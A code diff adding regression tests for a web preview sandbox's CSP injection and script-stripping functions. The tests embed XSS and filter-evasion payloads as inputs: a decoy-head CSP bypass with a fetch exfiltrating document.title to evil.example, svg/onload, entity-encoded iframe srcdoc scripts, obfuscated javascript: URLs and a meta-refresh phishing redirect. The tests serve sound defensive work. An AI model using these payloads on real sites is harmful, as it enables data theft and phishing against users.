@@ -1,4 +1,9 @@
-import { PREVIEW_CSP, escapeForInlineJsTemplate, injectPreviewCsp } from "@/lib/previewSandbox";
+import {
+  PREVIEW_CSP,
+  escapeForInlineJsTemplate,
+  injectPreviewCsp,
+  stripScripts,
+} from "@/lib/previewSandbox";
 
 describe("PREVIEW_CSP", () => {
   it("blocks network egress and forms, allows inline scripts", () => {
@@ -55,5 +60,116 @@ describe("injectPreviewCsp", () => {
     const out = injectPreviewCsp(html);
     expect(out).not.toContain("window.pwned");
     expect(out).toContain(`content="${PREVIEW_CSP}"`);
+  });
+
+  // BUG FIX (was a confirmed sandbox escape): a decoy "<head" inside a
+  // <script> comment (or <style>/HTML comment/<textarea>/<title>) that
+  // appears before the real <head> used to fool the plain-text search into
+  // splicing the CSP meta into that inert block instead — leaving the real
+  // document with no CSP at all, and the attacker's script running with
+  // full network egress despite connect-src 'none'. Each case below is the
+  // exact confirmed PoC shape; the CSP must land inside the REAL <head>,
+  // and the decoy content must never be treated as if it were real markup.
+  it("is not fooled by a decoy <head> inside a <script> comment", () => {
+    const html =
+      '<!DOCTYPE html><html><script>\n// <head>\nfetch("https://evil.example/steal?x=" + document.title);\n</script>\n<head><title>Legit</title></head><body>Hello</body></html>';
+    const out = injectPreviewCsp(html);
+    // The CSP must be inside the real <head>, immediately before <title>.
+    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Legit</title></head>`);
+    // The attacker's script must be gone entirely (it's "before head").
+    expect(out).not.toContain("evil.example");
+  });
+
+  it("is not fooled by a decoy <head> inside a <style> block", () => {
+    const html =
+      '<!DOCTYPE html><html><style>/* <head> */ body { color: red; }</style><head><title>Real</title></head><body></body></html>';
+    const out = injectPreviewCsp(html);
+    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Real</title></head>`);
+  });
+
+  it("is not fooled by a decoy <head> inside an HTML comment", () => {
+    const html =
+      "<!DOCTYPE html><html><!-- <head> --><head><title>Real</title></head><body></body></html>";
+    const out = injectPreviewCsp(html);
+    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Real</title></head>`);
+  });
+
+  it("is not fooled by a decoy <head> inside a <textarea>", () => {
+    const html =
+      "<!DOCTYPE html><html><textarea>sample: <head> tag</textarea><head><title>Real</title></head><body></body></html>";
+    const out = injectPreviewCsp(html);
+    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Real</title></head>`);
+  });
+});
+
+describe("stripScripts", () => {
+  it("strips plain <script> tags and on*= handlers (baseline, unchanged)", () => {
+    const out = stripScripts('<script>alert(1)</script><div onclick="alert(2)">x</div>');
+    expect(out).not.toContain("<script>");
+    expect(out).not.toContain("alert(1)");
+    expect(out).not.toContain("onclick");
+  });
+
+  // BUG FIX (was a confirmed bypass): "/" is a valid inter-attribute
+  // separator in HTML, not just whitespace, so <svg/onload=...> fires
+  // automatically on render — a well-known, real-world XSS-filter-evasion
+  // technique. The old regex required literal whitespace before "on\w+".
+  it("strips on*= handlers separated by '/' instead of whitespace", () => {
+    const out = stripScripts('<svg/onload=alert(document.domain)>');
+    expect(out).not.toContain("onload");
+    expect(out).not.toContain("alert(document.domain)");
+  });
+
+  // BUG FIX (was a confirmed bypass): browsers HTML-decode an iframe's
+  // srcdoc attribute before parsing it as the iframe's own document, so an
+  // entity-encoded <script> inside srcdoc executes on load with zero
+  // clicks. The old code only looked for the literal string "<script",
+  // never inside an attribute value.
+  it("strips iframe srcdoc containing an entity-encoded script", () => {
+    const out = stripScripts(
+      '<iframe srcdoc="&lt;script&gt;fetch(&#39;https://evil.example&#39;)&lt;/script&gt;"></iframe>',
+    );
+    expect(out).not.toContain("srcdoc");
+  });
+
+  it("strips javascript: URLs from href/src/action/formaction/data attributes", () => {
+    const cases = [
+      '<a href="javascript:alert(1)">click</a>',
+      "<a href='javascript:alert(1)'>click</a>",
+      '<img src="javascript:alert(1)">',
+      '<form action="javascript:alert(1)"><button formaction="javascript:alert(1)">go</button></form>',
+      '<object data="javascript:alert(1)"></object>',
+    ];
+    for (const html of cases) {
+      const out = stripScripts(html);
+      expect(out.toLowerCase()).not.toContain("javascript:");
+    }
+  });
+
+  it("strips javascript: URLs obfuscated with embedded whitespace/control characters", () => {
+    const out = stripScripts('<a href="java\tscript:alert(1)">click</a>');
+    expect(out.toLowerCase()).not.toContain("javascript:");
+  });
+
+  it("strips vbscript: URLs", () => {
+    const out = stripScripts('<a href="vbscript:msgbox(1)">click</a>');
+    expect(out.toLowerCase()).not.toContain("vbscript:");
+  });
+
+  it("strips zero-click meta-refresh redirects", () => {
+    const out = stripScripts(
+      '<meta http-equiv="refresh" content="0;url=https://evil.example/phish">',
+    );
+    expect(out).not.toContain("evil.example");
+    expect(out.toLowerCase()).not.toContain("refresh");
+  });
+
+  it("leaves ordinary safe links and images untouched", () => {
+    const out = stripScripts(
+      '<a href="https://example.com">link</a><img src="https://example.com/x.png"><img src="data:image/png;base64,AAAA">',
+    );
+    expect(out).toContain('href="https://example.com"');
+    expect(out).toContain('src="https://example.com/x.png"');
+    expect(out).toContain('src="data:image/png;base64,AAAA"');
   });
 });
